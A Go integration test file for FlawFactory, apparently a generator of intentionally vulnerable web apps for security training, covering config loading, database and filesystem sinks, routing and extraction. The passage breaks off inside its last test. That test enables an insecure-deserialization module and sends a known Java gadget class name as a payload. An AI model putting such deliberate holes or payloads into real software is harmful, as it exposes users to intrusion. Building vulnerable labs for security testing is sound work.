package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/RIZZZIOM/FlawFactory/builder"
	"github.com/RIZZZIOM/FlawFactory/config"
	"github.com/RIZZZIOM/FlawFactory/modules"
	"github.com/RIZZZIOM/FlawFactory/server"
	"github.com/RIZZZIOM/FlawFactory/sinks"
)

// =============================================================================
// Integration Test: Config → Builder → Server Flow
// =============================================================================

func TestIntegration_ConfigToServer(t *testing.T) {
	configContent := `
app:
  name: "Integration Test App"
  port: 18091

endpoints:
  - path: "/test"
    method: "GET"
    response_type: "json"
    vulnerabilities: []
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		t.Fatalf("Failed to write config: %v", err)
	}

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	if cfg.App.Name != "Integration Test App" {
		t.Errorf("Expected app name 'Integration Test App', got '%s'", cfg.App.Name)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	if srv == nil {
		t.Fatal("Server is nil")
	}

	router := srv.Router()
	if router == nil {
		t.Fatal("Router is nil")
	}
}

func TestIntegration_ConfigWithData(t *testing.T) {
	configContent := `
app:
  name: "Data Test App"
  port: 18092

data:
  tables:
    products:
      columns:
        - id
        - name
        - price
      rows:
        - ["1", "Widget", "9.99"]
        - ["2", "Gadget", "19.99"]

endpoints:
  - path: "/products"
    method: "GET"
    response_type: "json"
    vulnerabilities: []
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		t.Fatalf("Failed to write config: %v", err)
	}

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	if cfg.Data == nil || len(cfg.Data.Tables) != 1 {
		t.Fatalf("Expected 1 table, got %v", cfg.Data)
	}

	table, exists := cfg.Data.Tables["products"]
	if !exists {
		t.Fatal("products table not found")
	}
	if len(table.Columns) != 3 {
		t.Errorf("Expected 3 columns, got %d", len(table.Columns))
	}
	if len(table.Rows) != 2 {
		t.Errorf("Expected 2 seed rows, got %d", len(table.Rows))
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	if srv == nil {
		t.Fatal("Server is nil")
	}
}

func TestIntegration_ConfigWithFiles(t *testing.T) {
	configContent := `
app:
  name: "Files Test App"
  port: 18093

files:
  - path: "readme.txt"
    content: "Hello from integration test"
  - path: "data/info.json"
    content: '{"version": "1.0"}'

endpoints:
  - path: "/files"
    method: "GET"
    response_type: "json"
    vulnerabilities: []
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		t.Fatalf("Failed to write config: %v", err)
	}

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	if len(cfg.Files) != 2 {
		t.Fatalf("Expected 2 files, got %d", len(cfg.Files))
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	if srv == nil {
		t.Fatal("Server is nil")
	}
}

// =============================================================================
// Integration Test: Sink Interactions
// =============================================================================

func TestIntegration_SQLiteSinkOperations(t *testing.T) {
	sqlite, err := sinks.NewSQLite()
	if err != nil {
		t.Fatalf("Failed to create SQLite sink: %v", err)
	}
	defer sqlite.Close()

	err = sqlite.CreateTable("users", []string{"id", "username", "email"})
	if err != nil {
		t.Fatalf("Failed to create table: %v", err)
	}

	// Insert rows
	err = sqlite.InsertRow("users", []string{"id", "username", "email"}, []interface{}{"1", "alice", "alice@example.com"})
	if err != nil {
		t.Fatalf("Insert failed: %v", err)
	}

	err = sqlite.InsertRow("users", []string{"id", "username", "email"}, []interface{}{"2", "bob", "bob@example.com"})
	if err != nil {
		t.Fatalf("Insert failed: %v", err)
	}

	// Query with safe input
	results, err := sqlite.Query("SELECT * FROM users WHERE id = '1'")
	if err != nil {
		t.Fatalf("Query failed: %v", err)
	}

	if len(results) != 1 {
		t.Errorf("Expected 1 result, got %d", len(results))
	}

	// Insert new row
	err = sqlite.InsertRow("users", []string{"id", "username", "email"}, []interface{}{"3", "charlie", "charlie@example.com"})
	if err != nil {
		t.Fatalf("Insert failed: %v", err)
	}

	// Verify insert
	results, err = sqlite.Query("SELECT * FROM users")
	if err != nil {
		t.Fatalf("Query failed: %v", err)
	}

	if len(results) != 3 {
		t.Errorf("Expected 3 results after insert, got %d", len(results))
	}
}

func TestIntegration_FilesystemSinkOperations(t *testing.T) {
	fs, err := sinks.NewFilesystemWithPath(t.TempDir())
	if err != nil {
		t.Fatalf("Failed to create filesystem sink: %v", err)
	}
	defer fs.Close()

	err = fs.WriteFile("test.txt", "Hello World")
	if err != nil {
		t.Fatalf("Failed to write file: %v", err)
	}

	err = fs.WriteFile("subdir/nested.txt", "Nested content")
	if err != nil {
		t.Fatalf("Failed to write nested file: %v", err)
	}

	content, err := fs.Read("test.txt")
	if err != nil {
		t.Fatalf("Failed to read file: %v", err)
	}

	if content != "Hello World" {
		t.Errorf("Expected 'Hello World', got '%s'", content)
	}

	content, err = fs.Read("subdir/nested.txt")
	if err != nil {
		t.Fatalf("Failed to read nested file: %v", err)
	}

	if content != "Nested content" {
		t.Errorf("Expected 'Nested content', got '%s'", content)
	}
}

func TestIntegration_CommandSinkOperations(t *testing.T) {
	cmd := sinks.NewCommand()
	defer cmd.Close()

	output, err := cmd.Execute("echo integration-test")
	if err != nil {
		t.Fatalf("Command execution failed: %v", err)
	}

	if !strings.Contains(output, "integration-test") {
		t.Errorf("Expected output to contain 'integration-test', got '%s'", output)
	}
}

func TestIntegration_HTTPSinkOperations(t *testing.T) {
	testServer := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/api/data":
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
		case "/api/echo":
			body, _ := io.ReadAll(r.Body)
			w.Write(body)
		default:
			w.WriteHeader(http.StatusNotFound)
		}
	}))
	defer testServer.Close()

	httpSink := sinks.NewHTTP()
	defer httpSink.Close()

	resp, err := httpSink.Fetch(testServer.URL + "/api/data")
	if err != nil {
		t.Fatalf("Fetch failed: %v", err)
	}

	if resp.StatusCode != 200 {
		t.Errorf("Expected status 200, got %d", resp.StatusCode)
	}

	if !strings.Contains(resp.Body, "ok") {
		t.Errorf("Expected body to contain 'ok', got '%s'", resp.Body)
	}

	resp, err = httpSink.FetchWithOptions(testServer.URL+"/api/echo", sinks.HTTPOptions{
		Method: "POST",
		Body:   "test data",
	})
	if err != nil {
		t.Fatalf("POST failed: %v", err)
	}

	if resp.Body != "test data" {
		t.Errorf("Expected 'test data', got '%s'", resp.Body)
	}
}

// =============================================================================
// Integration Test: Server HTTP Handling
// =============================================================================

func TestIntegration_ServerHealthEndpoint(t *testing.T) {
	configContent := `
app:
  name: "Health Test"
  port: 18094

endpoints:
  - path: "/api"
    method: "GET"
    response_type: "json"
    vulnerabilities: []
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}
	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	req := httptest.NewRequest("GET", "/health", nil)
	w := httptest.NewRecorder()

	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	if response["status"] != "healthy" {
		t.Errorf("Expected status 'healthy', got '%v'", response["status"])
	}
}

func TestIntegration_ServerCustomEndpoint(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()

	router.HandleFunc("GET", "/api/info", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{
			"name":    "FlawFactory",
			"version": "1.0.0",
		})
	})

	req := httptest.NewRequest("GET", "/api/info", nil)
	w := httptest.NewRecorder()

	router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]string
	json.NewDecoder(w.Body).Decode(&response)

	if response["name"] != "FlawFactory" {
		t.Errorf("Expected name 'FlawFactory', got '%s'", response["name"])
	}
}

func TestIntegration_ServerMultipleEndpoints(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()

	router.HandleFunc("GET", "/users", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode([]map[string]string{
			{"id": "1", "name": "Alice"},
			{"id": "2", "name": "Bob"},
		})
	})

	router.HandleFunc("GET", "/products", func(w http.ResponseWriter, r *http.Request) {
		json.NewEncoder(w).Encode([]map[string]string{
			{"id": "1", "name": "Widget"},
		})
	})

	router.HandleFunc("POST", "/users", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusCreated)
		w.Write([]byte(`{"created": true}`))
	})

	// Test GET /users
	req := httptest.NewRequest("GET", "/users", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Errorf("GET /users: expected 200, got %d", w.Code)
	}

	// Test GET /products
	req = httptest.NewRequest("GET", "/products", nil)
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Errorf("GET /products: expected 200, got %d", w.Code)
	}

	// Test POST /users
	req = httptest.NewRequest("POST", "/users", strings.NewReader(`{"name":"Charlie"}`))
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	if w.Code != http.StatusCreated {
		t.Errorf("POST /users: expected 201, got %d", w.Code)
	}
}

// =============================================================================
// Integration Test: Input Extraction Flow
// =============================================================================

func TestIntegration_ExtractorWithServer(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()

	router.HandleFunc("GET", "/search", func(w http.ResponseWriter, r *http.Request) {
		query, err := extractor.Extract(r, "query_param", "q")
		if err != nil {
			http.Error(w, "Missing query parameter", http.StatusBadRequest)
			return
		}
		json.NewEncoder(w).Encode(map[string]string{
			"searched_for": query,
		})
	})

	req := httptest.NewRequest("GET", "/search?q=test-query", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected 200, got %d", w.Code)
	}

	var response map[string]string
	json.NewDecoder(w.Body).Decode(&response)

	if response["searched_for"] != "test-query" {
		t.Errorf("Expected 'test-query', got '%s'", response["searched_for"])
	}
}

func TestIntegration_ExtractorHeaderAndCookie(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()

	router.HandleFunc("GET", "/auth", func(w http.ResponseWriter, r *http.Request) {
		token, err := extractor.Extract(r, "header", "Authorization")
		if err != nil {
			token = "none"
		}

		sessionID, err := extractor.Extract(r, "cookie", "session")
		if err != nil {
			sessionID = "none"
		}

		json.NewEncoder(w).Encode(map[string]string{
			"token":   token,
			"session": sessionID,
		})
	})

	req := httptest.NewRequest("GET", "/auth", nil)
	req.Header.Set("Authorization", "Bearer test-token")
	req.AddCookie(&http.Cookie{Name: "session", Value: "abc123"})
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	var response map[string]string
	json.NewDecoder(w.Body).Decode(&response)

	if response["token"] != "Bearer test-token" {
		t.Errorf("Expected 'Bearer test-token', got '%s'", response["token"])
	}

	if response["session"] != "abc123" {
		t.Errorf("Expected 'abc123', got '%s'", response["session"])
	}
}

func TestIntegration_ExtractorJSONBody(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()

	router.HandleFunc("POST", "/data", func(w http.ResponseWriter, r *http.Request) {
		// Read body once and parse JSON manually since extractor consumes the body
		bodyBytes, _ := io.ReadAll(r.Body)

		// Create a new reader for each extraction by restoring the body
		r.Body = io.NopCloser(bytes.NewReader(bodyBytes))
		name, _ := extractor.Extract(r, "json_field", "user.name")

		// Restore body again for second extraction
		r.Body = io.NopCloser(bytes.NewReader(bodyBytes))
		email, _ := extractor.Extract(r, "json_field", "user.email")

		json.NewEncoder(w).Encode(map[string]string{
			"extracted_name":  name,
			"extracted_email": email,
		})
	})

	body := `{"user": {"name": "Alice", "email": "alice@example.com"}}`
	req := httptest.NewRequest("POST", "/data", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	var response map[string]string
	json.NewDecoder(w.Body).Decode(&response)

	if response["extracted_name"] != "Alice" {
		t.Errorf("Expected 'Alice', got '%s'", response["extracted_name"])
	}

	if response["extracted_email"] != "alice@example.com" {
		t.Errorf("Expected 'alice@example.com', got '%s'", response["extracted_email"])
	}
}

func TestIntegration_ExtractorFormData(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()

	router.HandleFunc("POST", "/submit", func(w http.ResponseWriter, r *http.Request) {
		username, _ := extractor.Extract(r, "form_field", "username")
		password, _ := extractor.Extract(r, "form_field", "password")

		json.NewEncoder(w).Encode(map[string]string{
			"username": username,
			"password": password,
		})
	})

	body := "username=testuser&password=testpass"
	req := httptest.NewRequest("POST", "/submit", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	var response map[string]string
	json.NewDecoder(w.Body).Decode(&response)

	if response["username"] != "testuser" {
		t.Errorf("Expected 'testuser', got '%s'", response["username"])
	}
}

// =============================================================================
// Integration Test: Response Builder Flow
// =============================================================================

func TestIntegration_ResponseBuilder(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	rb := server.NewResponseBuilder()

	router.HandleFunc("GET", "/json", func(w http.ResponseWriter, r *http.Request) {
		rb.Send(w, "json", map[string]string{"format": "json"})
	})

	router.HandleFunc("GET", "/html", func(w http.ResponseWriter, r *http.Request) {
		rb.Send(w, "html", "<h1>Hello</h1>")
	})

	router.HandleFunc("GET", "/text", func(w http.ResponseWriter, r *http.Request) {
		rb.Send(w, "text", "Plain text response")
	})

	// Test JSON
	req := httptest.NewRequest("GET", "/json", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)
	if w.Header().Get("Content-Type") != "application/json" {
		t.Errorf("Expected JSON content type, got '%s'", w.Header().Get("Content-Type"))
	}

	// Test HTML
	req = httptest.NewRequest("GET", "/html", nil)
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	if !strings.HasPrefix(w.Header().Get("Content-Type"), "text/html") {
		t.Errorf("Expected HTML content type, got '%s'", w.Header().Get("Content-Type"))
	}
	if !strings.Contains(w.Body.String(), "<h1>Hello</h1>") {
		t.Errorf("Expected HTML content, got '%s'", w.Body.String())
	}

	// Test text
	req = httptest.NewRequest("GET", "/text", nil)
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)
	if !strings.HasPrefix(w.Header().Get("Content-Type"), "text/plain") {
		t.Errorf("Expected text content type, got '%s'", w.Header().Get("Content-Type"))
	}
}

func TestIntegration_ResponseBuilderError(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	rb := server.NewResponseBuilder()

	router.HandleFunc("GET", "/error", func(w http.ResponseWriter, r *http.Request) {
		rb.SendError(w, "json", 500, "Internal Server Error", server.DebugInfo{})
	})

	req := httptest.NewRequest("GET", "/error", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != 500 {
		t.Errorf("Expected status 500, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	if response["error"] != "Internal Server Error" {
		t.Errorf("Expected error message, got '%v'", response["error"])
	}
}

// =============================================================================
// Integration Test: Module Registry
// =============================================================================

type testModule struct {
	name        string
	description string
	sinkType    string
}

func (m *testModule) Info() modules.ModuleInfo {
	return modules.ModuleInfo{
		Name:                m.name,
		Description:         m.description,
		SupportedPlacements: []string{"query_param", "header", "cookie"},
		RequiresSink:        m.sinkType,
	}
}

func (m *testModule) Handle(ctx *modules.HandlerContext) (*modules.Result, error) {
	return &modules.Result{
		Data:       fmt.Sprintf("Handled: %s", ctx.Input),
		StatusCode: 200,
	}, nil
}

func TestIntegration_ModuleRegistry(t *testing.T) {
	// Use unique names for each test run to avoid conflicts with global registry
	mod1Name := fmt.Sprintf("integration_test_module_1_%d", time.Now().UnixNano())
	mod2Name := fmt.Sprintf("integration_test_module_2_%d", time.Now().UnixNano())

	mod1 := &testModule{
		name:        mod1Name,
		description: "First test module",
		sinkType:    "sqlite",
	}
	mod2 := &testModule{
		name:        mod2Name,
		description: "Second test module",
		sinkType:    "filesystem",
	}

	// Use global registry functions for testing
	err := modules.Register(mod1)
	if err != nil {
		t.Fatalf("Failed to register module 1: %v", err)
	}

	err = modules.Register(mod2)
	if err != nil {
		t.Fatalf("Failed to register module 2: %v", err)
	}

	mod, err := modules.Get(mod1Name)
	if err != nil {
		t.Fatalf("Failed to get module: %v", err)
	}

	ctx := &modules.HandlerContext{
		Input:     "safe-test-input",
		Placement: "query_param",
		Param:     "id",
	}

	result, err := mod.Handle(ctx)
	if err != nil {
		t.Fatalf("Handle failed: %v", err)
	}

	if result.Data != "Handled: safe-test-input" {
		t.Errorf("Unexpected result: %v", result.Data)
	}

	list := modules.List()
	if len(list) < 2 {
		t.Errorf("Expected at least 2 modules in list, got %d", len(list))
	}
}

// =============================================================================
// Integration Test: Full Request Flow (Safe Inputs Only)
// =============================================================================

func TestIntegration_FullRequestFlow_QueryToResponse(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()
	rb := server.NewResponseBuilder()

	router.HandleFunc("GET", "/process", func(w http.ResponseWriter, r *http.Request) {
		input, _ := extractor.Extract(r, "query_param", "data")
		if input == "" {
			rb.SendError(w, "json", 400, "Missing data parameter", server.DebugInfo{})
			return
		}

		processed := strings.ToUpper(input)

		rb.Send(w, "json", map[string]string{
			"input":     input,
			"processed": processed,
		})
	})

	req := httptest.NewRequest("GET", "/process?data=hello", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected 200, got %d", w.Code)
	}

	var response struct {
		Data map[string]string `json:"data"`
	}
	json.NewDecoder(w.Body).Decode(&response)

	if response.Data["input"] != "hello" {
		t.Errorf("Expected input 'hello', got '%s'", response.Data["input"])
	}

	if response.Data["processed"] != "HELLO" {
		t.Errorf("Expected processed 'HELLO', got '%s'", response.Data["processed"])
	}
}

func TestIntegration_FullRequestFlow_WithSQLite(t *testing.T) {
	sqlite, err := sinks.NewSQLite()
	if err != nil {
		t.Fatalf("Failed to create SQLite: %v", err)
	}
	defer sqlite.Close()

	sqlite.CreateTable("items", []string{"id", "name", "category"})
	sqlite.InsertRow("items", []string{"id", "name", "category"}, []interface{}{"1", "Apple", "Fruit"})
	sqlite.InsertRow("items", []string{"id", "name", "category"}, []interface{}{"2", "Carrot", "Vegetable"})
	sqlite.InsertRow("items", []string{"id", "name", "category"}, []interface{}{"3", "Banana", "Fruit"})

	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()
	rb := server.NewResponseBuilder()

	router.HandleFunc("GET", "/items", func(w http.ResponseWriter, r *http.Request) {
		category, _ := extractor.Extract(r, "query_param", "category")
		if category == "" {
			results, _ := sqlite.Query("SELECT * FROM items")
			rb.Send(w, "json", results)
			return
		}

		if !isAlphanumeric(category) {
			rb.SendError(w, "json", 400, "Invalid category", server.DebugInfo{})
			return
		}

		results, _ := sqlite.Query(fmt.Sprintf("SELECT * FROM items WHERE category = '%s'", category))
		rb.Send(w, "json", results)
	})

	// Test: Get all items
	req := httptest.NewRequest("GET", "/items", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	var response struct {
		Data []map[string]interface{} `json:"data"`
	}
	json.NewDecoder(w.Body).Decode(&response)

	if len(response.Data) != 3 {
		t.Errorf("Expected 3 items, got %d", len(response.Data))
	}

	// Test: Filter by category
	req = httptest.NewRequest("GET", "/items?category=Fruit", nil)
	w = httptest.NewRecorder()
	router.ServeHTTP(w, req)

	json.NewDecoder(w.Body).Decode(&response)

	if len(response.Data) != 2 {
		t.Errorf("Expected 2 fruit items, got %d", len(response.Data))
	}
}

func TestIntegration_FullRequestFlow_WithFilesystem(t *testing.T) {
	fs, _ := sinks.NewFilesystemWithPath(t.TempDir())
	defer fs.Close()

	fs.WriteFile("public/readme.txt", "Public readme content")
	fs.WriteFile("public/info.txt", "Public info content")

	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()
	rb := server.NewResponseBuilder()

	router.HandleFunc("GET", "/files", func(w http.ResponseWriter, r *http.Request) {
		filename, err := extractor.Extract(r, "query_param", "name")
		if err != nil {
			rb.SendError(w, "json", 400, "Missing filename", server.DebugInfo{})
			return
		}

		if !isSafeFilename(filename) {
			rb.SendError(w, "json", 400, "Invalid filename", server.DebugInfo{})
			return
		}

		content, err := fs.Read("public/" + filename)
		if err != nil {
			rb.SendError(w, "json", 404, "File not found", server.DebugInfo{})
			return
		}

		rb.Send(w, "text", content)
	})

	req := httptest.NewRequest("GET", "/files?name=readme.txt", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected 200, got %d", w.Code)
	}

	if w.Body.String() != "Public readme content" {
		t.Errorf("Unexpected content: %s", w.Body.String())
	}
}

// =============================================================================
// Integration Test: Server Lifecycle
// =============================================================================

func TestIntegration_ServerStartAndShutdown(t *testing.T) {
	srv, err := server.New("127.0.0.1", 18090, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()

	router.HandleFunc("GET", "/ping", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("pong"))
	})

	go func() {
		srv.Start()
	}()

	time.Sleep(100 * time.Millisecond)

	resp, err := http.Get("http://127.0.0.1:18090/ping")
	if err != nil {
		t.Fatalf("Request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	if string(body) != "pong" {
		t.Errorf("Expected 'pong', got '%s'", string(body))
	}

	// Stop server
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err = srv.Stop(ctx)
	if err != nil {
		t.Errorf("Stop error: %v", err)
	}
}

func TestIntegration_ServerConcurrentRequests(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()

	requestCount := 0
	router.HandleFunc("GET", "/count", func(w http.ResponseWriter, r *http.Request) {
		requestCount++
		json.NewEncoder(w).Encode(map[string]int{"count": requestCount})
	})

	for i := 0; i < 10; i++ {
		req := httptest.NewRequest("GET", "/count", nil)
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Errorf("Request %d failed with status %d", i, w.Code)
		}
	}

	if requestCount != 10 {
		t.Errorf("Expected 10 requests processed, got %d", requestCount)
	}
}

// =============================================================================
// Integration Test: Error Handling
// =============================================================================

func TestIntegration_ErrorHandling_MissingInput(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()
	rb := server.NewResponseBuilder()

	router.HandleFunc("GET", "/require-param", func(w http.ResponseWriter, r *http.Request) {
		value, _ := extractor.Extract(r, "query_param", "required")
		if value == "" {
			rb.SendError(w, "json", 400, "Missing required parameter", server.DebugInfo{})
			return
		}
		w.Write([]byte("OK"))
	})

	req := httptest.NewRequest("GET", "/require-param", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected 400, got %d", w.Code)
	}
}

func TestIntegration_ErrorHandling_InvalidJSON(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()
	extractor := server.NewExtractor()
	rb := server.NewResponseBuilder()

	router.HandleFunc("POST", "/json-data", func(w http.ResponseWriter, r *http.Request) {
		_, err := extractor.Extract(r, "json_field", "name")
		if err != nil {
			rb.SendError(w, "json", 400, "Invalid JSON", server.DebugInfo{})
			return
		}
		w.Write([]byte("OK"))
	})

	req := httptest.NewRequest("POST", "/json-data", strings.NewReader("not valid json"))
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Errorf("Expected 400, got %d", w.Code)
	}
}

func TestIntegration_ErrorHandling_NotFound(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()

	router.HandleFunc("GET", "/exists", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("Found"))
	})

	req := httptest.NewRequest("GET", "/does-not-exist", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusNotFound {
		t.Errorf("Expected 404, got %d", w.Code)
	}
}

func TestIntegration_ErrorHandling_MethodNotAllowed(t *testing.T) {
	srv, err := server.New("127.0.0.1", 0, "", nil)
	if err != nil {
		t.Fatalf("Failed to create server: %v", err)
	}
	router := srv.Router()

	router.HandleFunc("GET", "/get-only", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte("GET only"))
	})

	req := httptest.NewRequest("POST", "/get-only", nil)
	w := httptest.NewRecorder()
	router.ServeHTTP(w, req)

	if w.Code != http.StatusMethodNotAllowed {
		t.Errorf("Expected 405, got %d", w.Code)
	}
}

// =============================================================================
// Integration Test: Complete Config to Running Server
// =============================================================================

func TestIntegration_CompleteFlow(t *testing.T) {
	configContent := `
app:
  name: "Complete Flow Test"
  port: 18091

data:
  tables:
    users:
      columns:
        - id
        - name
      rows:
        - ["1", "Admin"]

endpoints:
  - path: "/users"
    method: "GET"
    response_type: "json"
    vulnerabilities: []
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	req := httptest.NewRequest("GET", "/health", nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Health check failed with status %d", w.Code)
	}

	var healthResponse map[string]interface{}
	json.NewDecoder(w.Body).Decode(&healthResponse)

	if healthResponse["status"] != "healthy" {
		t.Errorf("Expected healthy status")
	}

	if healthResponse["app"] != "Complete Flow Test" {
		t.Errorf("Expected app name 'Complete Flow Test', got '%v'", healthResponse["app"])
	}
}

// =============================================================================
// Integration Test: Insecure Deserialization Module
// =============================================================================

func TestIntegration_InsecureDeserialization_QueryParam(t *testing.T) {
	configContent := `
app:
  name: "Deserialization Test"
  port: 18095

endpoints:
  - path: "/deserialize"
    method: "GET"
    response_type: "json"
    vulnerabilities:
      - type: insecure_deserialization
        placement: query_param
        param: data
        config:
          format: auto
          filter: none
          show_decoded: true
          emulate_execution: true
`
	tmpDir := t.TempDir()
	configPath := filepath.Join(tmpDir, "config.yaml")
	os.WriteFile(configPath, []byte(configContent), 0644)

	cfg, err := config.Load(configPath)
	if err != nil {
		t.Fatalf("Failed to load config: %v", err)
	}

	b := builder.New(cfg, "")
	srv, err := b.Build()
	if err != nil {
		t.Fatalf("Failed to build server: %v", err)
	}

	// Test with Java serialization pattern
	javaPayload := "org.apache.commons.collections.functors.InvokerTransformer"
	req := httptest.NewRequest("GET", "/deserialize?data="+javaPayload, nil)
	w := httptest.NewRecorder()
	srv.Router().ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Errorf("Expected status 200, got %d", w.Code)
	}

	var response map[string]interface{}
	json.NewDecoder(w.Body).Decode(&response)

	data, ok := response["data"].(map[string]interface{})
	if !ok {
		t.Fatalf("Expected data object in response")
	}

